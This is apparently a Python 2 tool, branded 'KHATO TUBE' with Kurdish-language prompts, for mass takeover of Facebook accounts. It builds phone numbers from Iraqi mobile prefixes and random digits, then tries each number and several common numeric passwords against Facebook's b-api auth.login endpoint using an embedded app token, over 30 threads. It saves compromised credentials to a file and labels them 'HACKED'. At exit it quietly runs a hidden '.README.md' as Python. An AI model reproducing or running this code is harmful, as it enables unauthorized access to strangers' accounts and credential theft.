import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(100000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = logo ="""
\033[1;93m  _  ___    _       _______ ____    _______ _    _ ____  ______ 
 | |/ / |  | |   /\|__   __/ __ \  |__   __| |  | |  _ \|  ____|
 | ' /| |__| |  /  \  | | | |  | |    | |  | |  | | |_) | |__   
 |  < |  __  | / /\ \ | | | |  | |    | |  | |  | |  _ <|  __|  
 | . \| |  | |/ ____ \| | | |__| |    | |  | |__| | |_) | |____ 
 |_|\_\_|  |_/_/    \_\_|  \____/     |_|   \____/|____/|______|                                                              
\033[1;97m  
\033[1;97m          SLAMW 7ALAYKWM
\033[1;97m  CHONN BASHNN HEWAM BASHI HAMW LAYAKA
\033[1;97m       YAKAM TOOLE CHANALAKAMAN 
\033[1;97m   AM TOOLAYA HEWADARM SWDE LEBBENN
"""
CorrectUsername = 'KHATO'
CorrectPassword = 'TUBE'
os.system('clear')
print logo
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;97m\xe2\x9e\xa3\x1b\x1b[31;1m USERNAME: ')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;97m\xe2\x9e\xa3\x1b\x1b[31;1m PASSWORD: ')
        if password == CorrectPassword:
            print '\x1b[1;92m[\xe2\x9c\x93] RASTA BRO BASHE DWATR '
            time.sleep(3)
            loop = 'false'
        else:
            print 'PASS HALAYA'
    else:
        print 'USER HALAYA'
os.system("xdg-open https://youtu.be/cqs7VCOcmdE")

back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    print 60 * '\x1b[1;97m='
    print '\x1b[1;93m[1]\x1b[1;93m ZHMARAKANI KURDISTAN      \x1b[1;97m\xe2\x87\x8b        \x1b[1;93m[YT]\x1b[1;93m KHATO TUBE '
    print 60 * '\x1b[1;97m='
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;93m ZHMARA YAK HALBZHERA  \x1b[1;93m>>>\x1b[1;97m  ')
    if bch == '':
        print '[!] HALAYA'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print 60 * '\x1b[1;93m='
        print '\x1b[1;97m 0770, 0750, 0773, 0751, 0771, 0772, 0780, 0781, 0782, 0783'
        try:
            c = raw_input(' CODEK HALBZHERA  : ')
            k = ''
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] HALAYA'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '0':
        exb()
    else:
        print '[!] HALAYA'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] GSHT RAQAMAKAN: ' + xxx)
    time.sleep(0.1)
    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;97m BWASTA GARNA BO DARAWA  QA BELA BO BAWKME NAKAI HHHHH...')
    time.sleep(0.1)
    psb('[!] BO WASTAN DNI TOOLAKA  [CTRL + Z] DAGRA')
    time.sleep(0.5)
    print 60* '\x1b[1;93m='

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m[HACKED BY KHATO TUBE]\x1b[1;93m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[NABETAWA]\x1b[1;97m ' + k + c + user + ' >>> ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1122334455'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m[HACKED BY KHATO TUBE]\x1b[1;93m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass2 + '\n')
                okb.close()
                oks.append(c + user + pass2)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[NABETAWA]\x1b[1;97m ' + k + c + user + ' >>> ' + pass2 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass2 + '\n')
                cps.close()
                cpb.append(c + user + pass2)
            else:
                pass3 = '1234554321'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m[HACKED BY KHATO TUBE]\x1b[1;93m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass3 + '\n')
                okb.close()
                oks.append(c + user + pass3)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[NABETAWA]\x1b[1;97m ' + k + c + user + ' >>> ' + pass3 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass3 + '\n')
                cps.close()
                cpb.append(c + user + pass3)
            else:
                pass4 = '112233445566'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m[HACKED BY KHATO TUBE]\x1b[1;93m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass4 + '\n')
                okb.close()
                oks.append(c + user + pass4)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[NABETAWA]\x1b[1;97m ' + k + c + user + ' >>> ' + pass4 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass4 + '\n')
                cps.close()
                cpb.append(c + user + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;91m='
    print '[\xe2\x9c\x93]\x1b[1;93m HACKKRDNAKA TAWAW BW ....'
    print '[\xe2\x9c\x93]\x1b[1;92m AWANAI HACK BW/\x1b[1;96mNABETAWA : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[ENTER BKAW XWAT LAGAL]')
    os.system('python2 .README.md')
if __name__ == '__main__':
    menu()
